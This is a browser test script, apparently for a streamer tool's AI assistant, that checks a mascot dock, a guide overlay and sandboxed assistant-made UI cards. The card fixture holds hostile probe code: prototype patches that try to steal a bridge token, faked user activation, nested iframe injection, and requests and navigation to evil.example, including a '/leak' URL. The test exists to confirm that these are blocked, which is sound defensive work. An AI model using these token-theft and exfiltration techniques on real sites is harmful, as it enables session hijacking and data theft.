// Site agent: mascot dock + guide overlay + sandboxed UI frames (dimasite).
// Every API call is mocked (route fulfil); nothing reaches production. Serves a built bundle itself when
// SITE_BUNDLE_DIR points at `<dist>/browser` (SPA fallback to index.csr.html), or uses SAAS_PREVIEW_URL.
//   SITE_BUNDLE_DIR=/path/to/browser SAAS_SCREENSHOT_DIR=/tmp/shots node ops/checks/site-agent-mascot-ui.mjs
import assert from 'node:assert/strict';
import { createReadStream } from 'node:fs';
import { mkdir, stat } from 'node:fs/promises';
import { createServer } from 'node:http';
import { extname, join, normalize } from 'node:path';

const { chromium } = await import(process.env.PLAYWRIGHT_MODULE || '/tmp/saas-cooldown-browser/node_modules/playwright/index.mjs');
const axePath = process.env.AXE_PATH || '/tmp/saas-cooldown-browser/node_modules/axe-core/axe.min.js';
const shots = process.env.SAAS_SCREENSHOT_DIR || '';
const API = 'https://api.domdimabot.com';

// ---------------------------------------------------------------- static server (built bundle)
let server = null;
let base = process.env.SAAS_PREVIEW_URL;
if (!base) {
  const root = process.env.SITE_BUNDLE_DIR;
  assert(root, 'set SAAS_PREVIEW_URL or SITE_BUNDLE_DIR');
  const types = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.mjs': 'text/javascript', '.css': 'text/css', '.json': 'application/json', '.svg': 'image/svg+xml', '.png': 'image/png', '.jpg': 'image/jpeg', '.webp': 'image/webp', '.woff2': 'font/woff2', '.ico': 'image/x-icon', '.txt': 'text/plain' };
  server = createServer(async (req, res) => {
    const path = normalize(decodeURIComponent(new URL(req.url, 'http://x').pathname)).replace(/^(\.\.[/\\])+/, '');
    let file = join(root, path);
    const info = await stat(file).catch(() => null);
    if (!info || info.isDirectory() || !file.startsWith(root)) file = join(root, 'index.csr.html');
    res.writeHead(200, { 'content-type': types[extname(file)] || 'application/octet-stream', 'cache-control': 'no-store' });
    createReadStream(file).pipe(res);
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  base = `http://127.0.0.1:${server.address().port}`;
}

// ---------------------------------------------------------------- fixtures (fictional channel)
const user = { id: '991507', login: 'mascot_owner', display_name: 'Mascot Owner' };
const now = Date.now();
const session = { id: 's1', channelId: user.id, userId: user.id, title: 'TTS this week', createdAt: now - 60000, updatedAt: now - 1000, activeTurnId: null, contextTokens: 2000, contextLimit: 100000 };
const UI_HTML = `<div class="stack">
  <p class="muted">Last 4 days</p>
  <div class="table-wrap"><table id="usage"><thead><tr><th>Day</th><th class="num">Messages</th><th class="num">TTS</th></tr></thead><tbody>
    <tr><td>Mon</td><td class="num">120</td><td class="num">14</td></tr><tr><td>Tue</td><td class="num">340</td><td class="num">30</td></tr>
    <tr><td>Wed</td><td class="num">90</td><td class="num">8</td></tr><tr><td>Thu</td><td class="num">200</td><td class="num">22</td></tr>
  </tbody></table></div>
  <div id="chart"></div>
  <form id="alert" class="stack">
    <label>Alert name <input name="name" required placeholder="Raid alert"></label>
    <label>Voice <select name="voice"><option value="dora">Dora</option><option value="ald">Ald</option></select></label>
    <label>Volume <input type="range" name="volume" min="0" max="100" value="40"></label>
    <label><input type="checkbox" name="loud"> Loud alerts</label>
    <div class="chips"><button type="button" class="chip" aria-pressed="true">Follows</button><span class="badge">New</span></div>
    <div class="row"><button type="submit" class="btn-primary">Save alert</button><button type="button" class="btn-ghost" id="go-tts">Open TTS</button><button type="button" class="btn" id="go-bad">Bad link</button><a href="https://evil.example/link" id="link">Outside link</a></div>
  </form>
  <p id="probe" class="muted">probing</p>
</div>`;
const UI_JS = `
dima.chart('#chart', { type: 'bar', title: 'Messages and TTS', labels: ['Mon', 'Tue', 'Wed', 'Thu'], series: [{ name: 'Messages', values: [120, 340, 90, 200] }, { name: 'TTS', values: [14, 30, 8, 22] }] });
const out = { origin: String(location.origin) };
try { localStorage.getItem('dimasite.session.v1'); out.storage = 'open'; } catch (e) { out.storage = 'blocked'; }
try { void top.localStorage.length; out.pageStorage = 'open'; } catch (e) { out.pageStorage = 'blocked'; }
try { void top.document.title; out.pageDoc = 'open'; } catch (e) { out.pageDoc = 'blocked'; }
try { void parent.document.title; out.relayDoc = 'open'; } catch (e) { out.relayDoc = 'blocked'; }
try { void document.cookie; out.cookie = 'open'; } catch (e) { out.cookie = 'blocked'; }
out.rtc = typeof RTCPeerConnection;
// Bridge actions need a real click: these run on load, without one, after trying to fake activation and to
// fish the bridge token out of the kit (patched built-ins, a setter on Object.prototype).
let leaked = null;
try { Object.defineProperty(UserActivation.prototype, 'isActive', { get() { return true; }, configurable: true }); } catch (e) { /* ignore */ }
try { Object.defineProperty(navigator, 'userActivation', { value: { isActive: true }, configurable: true }); } catch (e) { /* ignore */ }
const realAssign = Object.assign;
Object.assign = function (...args) { for (const arg of args) if (arg && arg.token) leaked = arg.token; return realAssign.apply(this, args); };
Object.defineProperty(Object.prototype, 'type', { set(value) { if (this && this.token) leaked = this.token; }, configurable: true });
out.autoSubmit = dima.submit({ auto: 1 });
out.autoNavigate = dima.navigate('modules.tts');
delete Object.prototype.type;
Object.assign = realAssign;
out.leak = leaked ? 'leaked' : 'none';
// The kit's script (it holds the bridge token) is gone before this code runs.
out.kitScript = [...document.scripts].some((s) => s.textContent.includes('dima' + 'Ui')) ? 'visible' : 'gone';
// No nested frame, whichever way: each would be a fresh realm with WebRTC.
try { document.createElement('iframe'); out.createFrame = 'open'; } catch (e) { out.createFrame = 'blocked'; }
try { document.body.attachShadow({ mode: 'open' }); out.shadow = 'open'; } catch (e) { out.shadow = 'blocked'; }
addEventListener('message', (e) => { if (e.data === 'nested-ran') out.nestedRan = true; });
document.body.insertAdjacentHTML('beforeend', '<iframe srcdoc="<script>parent.postMessage(&quot;nested-ran&quot;, &quot;*&quot;)<\\/script>"></iframe><iframe src="javascript:parent.postMessage(&quot;nested-ran&quot;,&quot;*&quot;)"></iframe>');
const img = new Image(); img.src = 'https://evil.example/pixel.png';
fetch('${API}/agent/${user.id}/status').then(() => { out.fetch = 'open'; }, () => { out.fetch = 'blocked'; })
  .then(() => new Promise((resolve) => setTimeout(resolve, 400)))
  .then(() => { out.frames = window.frames.length + document.querySelectorAll('iframe,frame,object,embed').length; document.getElementById('probe').textContent = JSON.stringify(out); });
document.getElementById('go-tts').addEventListener('click', () => dima.navigate('modules.tts'));
document.getElementById('go-bad').addEventListener('click', () => dima.navigate('https://evil.example/'));
setTimeout(() => { throw new Error('model bug on purpose'); }, 80);
`;
const NAV = { mode: 'offer', route: 'profile', label: 'your language setting', anchor: 'profile.language' };
const items = (nav = NAV) => [
  { kind: 'user', id: 'i1', turnId: 't1', text: 'Make me a raid alert and show this week', mode: 'send', at: now - 50000 },
  { kind: 'assistant', id: 'i2', turnId: 't1', text: 'Here is your week. Fill this in and I will set it up.', at: now - 40000, final: false },
  { kind: 'ui', id: 'i3', turnId: 't1', callId: 'c1', block: { title: 'Your week + raid alert', html: UI_HTML, css: '#probe{font-size:12px}', js: UI_JS, waitForInput: true }, state: 'open', at: now - 30000 },
  { kind: 'navigate', id: 'i4', turnId: 't1', callId: 'c2', action: nav, at: now - 20000 },
];

const errors = [];
let lastPage = null;
const browser = await chromium.launch({ args: ['--no-sandbox'] });
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const until = async (fn, label, ms = 8000) => { const end = Date.now() + ms; while (!(await fn())) { assert(Date.now() < end, label); await sleep(50); } };

async function open({ theme = 'dark', width = 1280, path = 'settings', reduced = false, remember = true, nav = NAV } = {}) {
  const app = { name: 'Mascot Owner', email: 'mascot@example.invalid', language: 'en', plan_tier: 'free', actived: true, chat_enabled: true,
    twitch_user_id: user.id, has_permissions: true, up_to_date_permissions: true, administrating: [] };
  const state = { submits: [], foreign: [], mutations: [] };
  const context = await browser.newContext({ viewport: { width, height: width < 640 ? 812 : 900 }, reducedMotion: reduced ? 'reduce' : 'no-preference', hasTouch: width < 640 });
  await context.addInitScript(({ user, app, theme, remember }) => {
    if (window !== window.top) return; // init scripts also run in the sandboxed card frames
    // What the page itself sees: errors from the card must never show up here.
    window.__pageErrors = [];
    addEventListener('error', (event) => window.__pageErrors.push(String(event.message)));
    addEventListener('unhandledrejection', (event) => window.__pageErrors.push(String(event.reason)));
    localStorage.setItem('theme', theme);
    localStorage.setItem('userLanguage', 'en');
    localStorage.setItem('dimasite.session.v1', JSON.stringify({ version: 2, token: 'fixture-only', createdAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 3600000).toISOString(), twitchUser: user, appUser: app, permissions: {} }));
    if (remember) sessionStorage.setItem(`dimasite.assistant.session.v1:${user.id}:${user.id}`, 's1');
  }, { user, app, theme, remember });
  await context.routeWebSocket(/./, (ws) => ws.close());
  await context.route('**/*', async (route) => {
    const request = route.request();
    const url = new URL(request.url());
    if (url.origin === new URL(base).origin) {
      if (url.pathname.startsWith(`/${user.login}/`)) return route.fulfill({ response: await route.fetch({ url: base + '/index.csr.html' }) });
      return route.continue();
    }
    // Anything a sub-frame (the card or its relay) asks for, and anything aimed at the card's fake target host.
    let fromFrame = false;
    try { fromFrame = !!request.frame().parentFrame(); } catch { /* service worker */ }
    if (fromFrame || url.hostname === 'evil.example') state.foreign.push(request.url());
    if (url.origin !== API) return route.abort();
    const ok = (data) => route.fulfill({ json: { error: false, status: 200, message: 'ok', data } });
    const p = url.pathname;
    const agent = `/agent/${user.id}`;
    if (p === `${agent}/status`) return ok({ enabled: true, role: 'owner', limits: { plan: 'free', used: 3, limit: 20, resetsAt: now + 3600000 }, contextLimit: 100000 });
    if (p === `${agent}/sessions`) return ok({ sessions: [session] });
    if (p === `${agent}/sessions/s1`) return ok({ session, items: items(nav), activeTurn: null });
    if (p === `${agent}/turns/t1/ui/c1`) { state.submits.push(request.postDataJSON()); return ok({ state: 'submitted' }); }
    if (p === `${agent}/changes`) return ok({ changes: [], next: null });
    if (p === '/auth/session') return ok({ twitch: user, app });
    if (p === '/users') return ok({ id: user.id, username: user.login, login: user.login, display_name: user.display_name, profile_image_url: '' });
    if (p === `/admins/${user.id}` || p === `/admins/${user.id}/candidates`) return ok([]);
    if (p.startsWith('/auth/access/')) return ok({ allowed: true });
    if (p.endsWith('/access')) return ok({ allowed: true, role: 'owner', planTier: 'free' });
    if (request.method() !== 'GET') state.mutations.push(`${request.method()} ${p}`);
    return ok({});
  });
  const page = await context.newPage();
  lastPage = page;
  page.setDefaultTimeout(15000);
  // Playwright also reports sub-frame errors here; the card's deliberate one is checked against __pageErrors instead.
  page.on('pageerror', (error) => { if (error.message !== 'model bug on purpose') errors.push(`${theme}/${width}: ${error.message}`); });
  await page.goto(`${base}/${user.login}/${path}`);
  await page.locator('.am-trigger').waitFor();
  return { context, page, state };
}

/** The card frame inside the relay frame. */
const frameOf = (page) => page.frameLocator('app-assistant-ui-frame iframe').frameLocator('iframe');
const phase = (page) => page.evaluate(() => document.querySelector('.am-guide')?.getAttribute('data-phase') ?? 'off');
async function axe(page, label) {
  await page.addScriptTag({ path: axePath });
  const result = await page.evaluate(async () => {
    const out = [];
    for (const selector of ['app-assistant-mascot', 'app-assistant-ui-frame']) {
      const el = document.querySelector(selector);
      if (!el) continue;
      const r = await window.axe.run(el, { runOnly: { type: 'tag', values: ['wcag2a', 'wcag2aa', 'wcag21aa'] } });
      out.push(...r.violations.map((v) => ({ id: v.id, nodes: v.nodes.map((n) => n.target) })));
    }
    return out;
  });
  assert.deepEqual(result, [], `axe ${label}`);
}
async function shot(page, name) {
  if (!shots) return;
  await mkdir(shots, { recursive: true });
  await page.screenshot({ path: `${shots}/${name}.png` });
}
/** Document-space boxes of the page's own elements (not the assistant). */
const layout = (page) => page.evaluate(() => Array.from(document.querySelectorAll('main *')).filter((el) => !el.closest('app-assistant-root')).slice(0, 600)
  .map((el) => { const r = el.getBoundingClientRect(); return [Math.round(r.left + scrollX), Math.round(r.top + scrollY), Math.round(r.width), Math.round(r.height)].join(','); }));

try {
  for (const theme of ['dark', 'light']) for (const width of [1280, 375]) {
    const tag = `${theme}-${width}`;
    const desktop = width >= 1024;
    const { context, page, state } = await open({ theme, width });

    // ---- docked mascot: visible, bubble, toggles the panel
    const dock = page.locator('.am-dock');
    await dock.waitFor();
    if (desktop) assert.equal(await page.locator('.am-bubble').innerText(), 'Ask', 'default bubble on desktop');
    else assert.equal(await page.locator('.am-bubble').isVisible(), true, 'first-visit hint on phones');
    const box = await page.locator('.am-art').boundingBox();
    assert(box.x + box.width <= width - 8 && box.y + box.height <= (width < 640 ? 812 : 900) - 8, 'docked bottom-right inside the screen');
    assert.equal(await page.evaluate(() => document.documentElement.scrollWidth > innerWidth), false, `no overflow ${tag}`);
    await axe(page, `dock ${tag}`);
    await shot(page, `mascot-dock-${tag}`);
    // A sticky save bar stuck at the bottom: the dock moves up above it, and back down when it goes.
    const restY = (await page.locator('.am-art').boundingBox()).y;
    await page.evaluate(() => {
      const bar = document.createElement('div');
      bar.className = 'lf-save-bar test-save-bar';
      Object.assign(bar.style, { position: 'fixed', left: '8px', right: '8px', bottom: '12px', height: '56px', background: 'rgba(124,58,237,.25)' });
      document.querySelector('main').append(bar);
    });
    await until(async () => { const art = await page.locator('.am-art').boundingBox(); const bar = await page.locator('.test-save-bar').boundingBox(); return art.y + art.height <= bar.y; }, `lifts above the save bar ${tag}`);
    await page.evaluate(() => document.querySelector('.test-save-bar').remove());
    await until(async () => Math.abs((await page.locator('.am-art').boundingBox()).y - restY) < 2, 'back down');
    await page.locator('.am-trigger').click();
    await until(() => page.locator('[data-assistant-panel]').isVisible(), `panel opens ${tag}`);
    assert.equal(await page.locator('.am-trigger').getAttribute('aria-expanded'), 'true');
    if (desktop) {
      // Stands at the side panel's edge, overlapping it a little.
      await until(async () => {
        const panel = await page.locator('[data-assistant-panel]').boundingBox();
        const art = await page.locator('.am-art').boundingBox();
        return panel && art && Math.abs(art.x + art.width - panel.x) < 40 && art.x < panel.x;
      }, 'mascot at the panel edge');
    } else {
      await until(() => page.evaluate(() => getComputedStyle(document.querySelector('.am-dock')).visibility === 'hidden'), 'tucked behind the phone sheet');
    }

    // ---- UI frame: sandbox, table + chart + form, probes
    const iframe = page.locator('app-assistant-ui-frame iframe');
    await iframe.waitFor();
    assert.equal(await iframe.getAttribute('sandbox'), 'allow-scripts');
    assert.match(await iframe.getAttribute('csp'), /connect-src 'none'/);
    await until(async () => (await page.locator('app-assistant-ui-frame .uf__slot').getAttribute('data-ui-frame')) === 'ready', `frame ready ${tag}`);
    const frame = frameOf(page);
    assert.equal(await page.locator('app-assistant-ui-frame .uf__made').textContent(), 'Made by the assistant', 'native label outside the card');
    assert.equal(await frame.locator('#usage tbody tr').count(), 4, 'table rows');
    await frame.locator('.dc-svg[role=img]').waitFor();
    assert.equal(await frame.locator('.dc-bar').count(), 8, 'two series × four bars');
    assert.equal(await frame.locator('.dc-legend li').count(), 2, 'legend for two series');
    await until(async () => (await frame.locator('#probe').innerText()).startsWith('{'), 'probes ran');
    const probe = JSON.parse(await frame.locator('#probe').innerText());
    assert.deepEqual(probe, { origin: 'null', storage: 'blocked', pageStorage: 'blocked', pageDoc: 'blocked', relayDoc: 'blocked', cookie: 'blocked', rtc: 'undefined',
      autoSubmit: false, autoNavigate: false, leak: 'none', kitScript: 'gone', createFrame: 'blocked', shadow: 'blocked', fetch: 'blocked', frames: 0 }, 'sandbox probes');
    assert.equal(state.submits.length, 0, 'nothing was submitted without a click');
    await frame.locator('.dima-note').waitFor(); // the model's error shows inside the card only
    assert.deepEqual(await page.evaluate(() => window.__pageErrors), [], 'card errors never reach the page');
    assert.equal(await frame.locator('iframe').count(), 0);
    assert.equal(await page.locator('app-assistant-ui-frame iframe').getAttribute('sandbox'), 'allow-scripts');
    assert.equal(await page.locator('app-assistant-ui-frame iframe').evaluate((f) => f.contentDocument), null, 'relay is cross-origin to the page');
    // A link to another site stays put.
    await frame.locator('#link').click();
    await sleep(300);
    assert.equal(await page.locator('app-assistant-ui-frame .uf__slot').getAttribute('data-ui-frame'), 'ready', 'link click ignored');
    assert.deepEqual(state.foreign, [], 'no request left the card (image, fetch, link)');
    // Height follows content (capped at 900).
    const frameHeight = (await iframe.boundingBox()).height;
    assert(frameHeight > 300 && frameHeight <= 900, `auto height ${frameHeight}`);
    // Theme tokens from the page.
    const colors = await frame.locator('body').evaluate(() => ({ text: getComputedStyle(document.body).color, theme: document.documentElement.dataset.theme }));
    assert.equal(colors.theme, theme);
    // Primary button fill is visible (undefined tokens would render transparent).
    const fill = await frame.locator('button[type=submit]').evaluate((b) => getComputedStyle(b).backgroundColor);
    assert.equal(fill, 'rgb(124, 58, 237)');
    // Chart tooltip on hover/focus.
    await frame.locator('.dc-svg').focus();
    await frame.locator('.dc-tip:not([hidden])').waitFor();
    assert.match(await frame.locator('.dc-tip').innerText(), /Mon[\s\S]*120[\s\S]*Messages/);
    await axe(page, `frame ${tag}`);
    // Inside the card: the kit's Live First styles pass axe too (the card is cross-origin to the page's axe run).
    const card = page.frames().find((f) => f.parentFrame()?.parentFrame());
    await card.addScriptTag({ path: axePath });
    const inside = await card.evaluate(async () => (await window.axe.run(document, { runOnly: { type: 'tag', values: ['wcag2a', 'wcag2aa', 'wcag21aa'] } })).violations.map((v) => ({ id: v.id, nodes: v.nodes.map((n) => n.target) })));
    assert.deepEqual(inside, [], `axe inside the card ${tag}`);
    await shot(page, `ui-frame-${tag}`);

    if (theme === 'dark' && desktop) {
      // Bad route keys never navigate; the form can't be sent until valid.
      const before = page.url();
      await frame.locator('#go-bad').click();
      await sleep(300);
      assert.equal(page.url(), before, 'unknown route ignored');
      await frame.locator('button[type=submit]').click();
      await sleep(300);
      assert.equal(state.submits.length, 0, 'required field blocks submit');
      // Slider fills up to the thumb.
      await frame.locator('input[type=range]').evaluate((el) => { el.value = '70'; el.dispatchEvent(new Event('input', { bubbles: true })); });
      assert.equal(await frame.locator('input[type=range]').evaluate((el) => el.style.getPropertyValue('--pct')), '0.7');
      // Live theme switch (navbar menu) re-posts tokens to the frame.
      await page.evaluate(() => document.querySelector('.auth-navbar__avatar-btn')?.click());
      await page.locator('button:has(.auth-navbar__theme-icon)').first().click();
      await until(async () => (await frame.locator('html').getAttribute('data-theme')) === 'light', 'frame follows the theme switch');
      assert.equal(await frame.locator('button[type=submit]').evaluate((b) => getComputedStyle(b).backgroundColor), 'rgb(124, 58, 237)');
      assert.equal(await frame.locator('body').evaluate(() => getComputedStyle(document.body).getPropertyValue('--surface').trim()), await page.evaluate(() => getComputedStyle(document.querySelector('app-assistant-ui-frame')).getPropertyValue('--tile').trim() || '#ffffff'));
      await page.evaluate(() => document.querySelector('.auth-navbar__avatar-btn')?.click());
      await page.locator('button:has(.auth-navbar__theme-icon)').first().click();
      await until(async () => (await frame.locator('html').getAttribute('data-theme')) === 'dark', 'and back to dark');
    }

    // Submit reaches the parent (and the API mock) with plain values; then the card locks.
    await frame.locator('input[name=name]').fill('Raid alert');
    await frame.locator('select[name=voice]').selectOption('ald');
    await frame.locator('input[name=loud]').check();
    await frame.locator('input[name=name]').press('Enter');
    await until(() => state.submits.length === 1, `submit sent ${tag}`);
    const sent = state.submits[0].values;
    assert.deepEqual(sent, { name: 'Raid alert', voice: 'ald', volume: theme === 'dark' && desktop ? 70 : 40, loud: true });
    await page.locator('.uf__chip--ok').waitFor();
    await until(() => frame.locator('input[name=name]').isDisabled(), 'locked after submit');
    assert.equal(await frame.locator('button[type=submit]').isDisabled(), true);
    await frame.locator('button[type=submit]').click({ force: true }).catch(() => {});
    await sleep(200);
    assert.equal(state.submits.length, 1, 'no second submit');

    // ---- guide: navigate card → profile → fly to the language setting
    await page.locator('[data-assistant-navigate] button').click();
    await until(() => page.url().endsWith('/profile'), 'navigated to profile');
    await until(async () => ['fly', 'show'].includes(await phase(page)), `guide starts ${tag}`, 9000);
    const sawFly = (await phase(page)) === 'fly';
    await until(async () => (await phase(page)) === 'show', 'guide lands');
    assert(sawFly, 'flight animation ran (motion allowed)');
    const target = page.locator('[data-assistant-anchor="profile.language"]');
    const t = await target.boundingBox();
    const ring = await page.locator('.am-ring').boundingBox();
    assert(Math.abs(ring.x - (t.x - 6)) < 3 && Math.abs(ring.width - (t.width + 12)) < 3, 'ring tracks the element');
    const figureBox = await page.locator('.am-guide__fig').boundingBox();
    // The overlay never takes clicks: hit-testing at the ring and the figure finds the page.
    const hits = await page.evaluate(([rx, ry, fx, fy]) => [document.elementFromPoint(rx, ry), document.elementFromPoint(fx, fy)].map((el) => !!el && !el.closest('.am-guide')), [ring.x + ring.width / 2, ring.y + ring.height / 2, figureBox.x + figureBox.width / 2, figureBox.y + figureBox.height / 2]);
    assert.deepEqual(hits, [true, true], 'elementFromPoint returns page elements');
    assert.equal(await page.evaluate(() => getComputedStyle(document.querySelector('.am-guide')).pointerEvents), 'none');
    assert.equal(await page.evaluate(() => document.documentElement.scrollWidth > innerWidth), false, 'no overflow during guide');
    assert.match(await page.locator('.am-guide__label').innerText(), /your language setting/);
    const labelBox = await page.locator('.am-guide__label').boundingBox();
    const overlaps = (a, b) => a.x < b.x + b.width && b.x < a.x + a.width && a.y < b.y + b.height && b.y < a.y + a.height;
    assert.ok(!overlaps(labelBox, t), 'label never covers the element');
    const during = await layout(page);
    await sleep(300); // label fade-in
    await shot(page, `guide-${tag}`);
    // Pressing anywhere dismisses (and the press still reaches the page).
    const label = page.locator('[data-assistant-anchor="profile.language"] label').first();
    await label.click();
    await until(async () => (await phase(page)) === 'off', 'dismissed by a press');
    assert.equal(await page.evaluate(() => document.activeElement?.closest('[data-assistant-anchor]')?.getAttribute('data-assistant-anchor') ?? null), 'profile.language', 'click reached the element under the ring');
    const after = await layout(page);
    assert.deepEqual(during, after, 'no page element moved or resized because of the overlay');
    assert.equal(await page.locator('.am-art').evaluate((el) => getComputedStyle(el).visibility), desktop ? 'visible' : 'hidden', 'figure back in the dock');
    if (theme === 'dark' && desktop) {
      // Frame → navigate with a known route key.
      await page.goBack();
      await until(() => page.url().endsWith('/settings'), 'back on settings');
    }
    assert.deepEqual(state.mutations, [], `no unexpected writes ${tag}`);
    await context.close();
  }

  {
    // A card that sends itself to another page: refused before any request leaves; the card is stopped and says so.
    const { context, page, state } = await open({ theme: 'light', width: 1280 });
    await page.locator('.am-trigger').click();
    await until(async () => (await page.locator('app-assistant-ui-frame .uf__slot').getAttribute('data-ui-frame')) === 'ready', 'card ready');
    // dima.navigate with a known route key opens that page under the current streamer.
    await frameOf(page).locator('#go-tts').click();
    await until(() => page.url().endsWith(`/${user.login}/modules/tts`), 'card opened the TTS page');
    await page.goBack();
    await until(() => page.url().endsWith('/settings'), 'back');
    await frameOf(page).locator('body').evaluate(() => { location.href = 'https://evil.example/leak?x=1'; });
    await page.locator('app-assistant-ui-frame .uf__note').waitFor();
    assert.match(await page.locator('app-assistant-ui-frame .uf__note').innerText(), /tried to open another page/);
    await sleep(500);
    assert.deepEqual(state.foreign, [], 'navigation refused by the relay policy: nothing reached evil.example');
    await shot(page, 'ui-frame-stopped-light-1280');
    await context.close();
  }
  {
    // The anchor shows up late (page still loading) inside a closed <details>: found, opened, pointed at.
    const { context, page } = await open({ width: 1280, nav: { mode: 'offer', route: 'profile', label: 'the voice picker', anchor: 'tts.voice' } });
    await page.locator('.am-trigger').click();
    await page.locator('[data-assistant-navigate] button').click();
    await until(() => page.url().endsWith('/profile'), 'on profile');
    await until(async () => (await phase(page)) === 'search', 'waiting for the anchor');
    await sleep(600);
    await page.evaluate(() => {
      const details = document.createElement('details');
      details.className = 'test-fold';
      details.innerHTML = '<summary>More options</summary><div data-assistant-anchor="tts.voice" style="padding:12px">Default voice</div>';
      document.querySelector('main').prepend(details);
    });
    await until(async () => ['fly', 'show'].includes(await phase(page)), 'found once it appears');
    assert.equal(await page.locator('.test-fold').evaluate((d) => d.open), true, 'closed details opened');
    await until(async () => (await phase(page)) === 'show', 'lands');
    await context.close();
  }
  {
    // Reduced motion: no flight (appears in place); Escape dismisses.
    const { context, page } = await open({ width: 1280, path: 'settings', reduced: true });
    await page.evaluate(() => { window.__phases = []; setInterval(() => { const p = document.querySelector('.am-guide')?.getAttribute('data-phase') ?? 'off'; if (window.__phases.at(-1) !== p) window.__phases.push(p); }, 10); });
    await page.locator('.am-trigger').click();
    await page.locator('[data-assistant-navigate] button').click();
    await until(async () => (await phase(page)) === 'show', 'reduced motion: appears directly');
    assert.ok(!(await page.evaluate(() => window.__phases)).includes('fly'), 'no flight with reduced motion');
    await page.keyboard.press('Escape');
    await until(async () => (await phase(page)) === 'off', 'Escape dismisses');
    assert.ok(!(await page.evaluate(() => window.__phases)).includes('back'), 'no flight home either');
    await shot(page, 'guide-reduced-dark-1280');
    await context.close();
  }
  {
    // The ~8 s timeout flies home; a route change ends a guide right away.
    const { context, page } = await open({ width: 1280, path: 'settings' });
    await page.locator('.am-trigger').click();
    await page.locator('[data-assistant-navigate] button').click();
    await until(async () => (await phase(page)) === 'show', 'guide shown');
    const shownAt = Date.now();
    await until(async () => (await phase(page)) === 'back', 'times out and flies home', 11000);
    const waited = Date.now() - shownAt;
    assert(waited > 7000, `stays ~8 s (${waited} ms)`);
    await until(async () => (await phase(page)) === 'off', 'home');
    await page.evaluate(() => history.back());
    await until(() => page.url().endsWith('/settings'), 'back on settings');
    await page.locator('[data-assistant-navigate] button').click();
    await until(async () => (await phase(page)) === 'show', 'guide again');
    await page.evaluate(() => history.back());
    await until(async () => (await phase(page)) === 'off', 'route change ends the guide', 3000);
    await context.close();
  }
  {
    // An anchor that isn't on the page clears quietly (searches ~8 s, never shows a ring). Phones: the "Ask" hint
    // shows until the assistant has been opened once.
    const { context, page } = await open({ width: 375, path: 'profile', nav: { mode: 'offer', route: 'settings', label: 'the TTS switch', anchor: 'tts.enable' } });
    await page.evaluate(() => { window.__phases = []; setInterval(() => { const p = document.querySelector('.am-guide')?.getAttribute('data-phase') ?? 'off'; if (window.__phases.at(-1) !== p) window.__phases.push(p); }, 25); });
    assert.equal(await page.locator('.am-bubble').isVisible(), true, 'first-visit hint on phones');
    await page.locator('.am-trigger').click();
    await until(() => page.evaluate(() => getComputedStyle(document.querySelector('.am-dock')).visibility === 'hidden'), 'tucked');
    await page.locator('[data-assistant-navigate] button').click();
    await until(() => page.url().endsWith('/settings'), 'navigated');
    await until(async () => (await phase(page)) === 'search', 'searching for the anchor');
    const searchAt = Date.now();
    await until(async () => (await phase(page)) === 'off', 'gives up quietly', 10000);
    assert.ok(Date.now() - searchAt > 7000, 'searched for ~8 s');
    await sleep(150);
    const seen = await page.evaluate(() => window.__phases);
    assert.ok(seen.includes('search') && !seen.includes('fly') && !seen.includes('show'), `never showed a ring (${seen})`);
    // The sheet peeks after navigating; close it from the peek bar.
    await page.locator('[data-assistant-panel]').getByRole('button', { name: 'Close assistant' }).first().click();
    await until(() => page.locator('[data-assistant-panel]').isHidden(), 'sheet closed');
    await until(() => page.locator('.am-bubble').isHidden(), 'default hint gone after the first open');
    await context.close();
  }

  assert.deepEqual(errors, [], 'no page errors');
  console.log('PASS site agent mascot + UI frames: dock (bubble, first-visit hint, toggle, panel edge on desktop / tucked behind the phone sheet, lifts above a stuck save bar), guide (navigate card → wait for the anchor → fly → ring tracks; late anchor inside closed <details>; label never covers it; no page element moves; hit-testing finds the page; press/Escape/8 s timeout/route change dismiss; reduced motion = no flight; missing anchor clears quietly), UI card (relay + card both sandbox=allow-scripts with csp; table/chart/form; storage, fetch, page/relay DOM, cookie, WebRTC blocked; scripted navigation refused with no request leaving and the card stopped; outside link ignored; card errors stay in the card; tokens + live theme switch; tooltip; required-field validation; slider fill; submit → API with plain values → locked; dima.navigate known route only), axe on mascot, card chrome and inside the card, 1280/375 × dark/light');
} catch (error) {
  if (shots && lastPage) await lastPage.screenshot({ path: `${shots}/FAILED.png` }).catch(() => {});
  throw error;
} finally {
  await browser.close();
  server?.close();
}
